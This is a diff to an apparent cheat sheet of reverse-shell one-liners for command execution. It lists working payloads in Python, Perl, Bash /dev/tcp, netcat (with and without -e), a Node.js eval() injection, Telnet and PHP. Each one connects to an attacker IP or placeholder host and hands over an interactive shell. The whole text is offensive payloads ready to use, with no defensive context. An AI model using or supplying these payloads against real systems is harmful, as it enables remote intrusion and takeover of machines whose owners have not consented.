@@ -1,21 +1,22 @@
 Command Execution:
-Python:
+#Python:
 python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.85\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
 
-Perl:
+#Perl:
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
-Bash:
+#Bash:
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
-Netcat 
-#this may not work if the system is using 
-#the legacy necat which does not support -e option
+#Netcat 
+*this may not work if the system is using 
+*the legacy necat which does not support -e option
 nc -e /bin/sh 10.0.0.1 1234
 
+#Netcat w/o -e 
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -I 2>&1 | nc <attacker_IP> <attacker_PORT> > /tmp/f
 
-Java Script Code Injection (eval())
-
+#Java Script Code Injection (eval())
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -28,3 +29,9 @@ Java Script Code Injection (eval())
     });
     return /a/;
 })();
+
+#Telnet 
+telnet <attacker_IP> 4444 | /bin/bash | telnet <attacker_IP> 4445
+
+#PHP
+php -r '$sock=fsockopen("<attacker_IP>",<attacker_PORT>); exec("/bin/sh -I <&3 >&3 2>&3");'
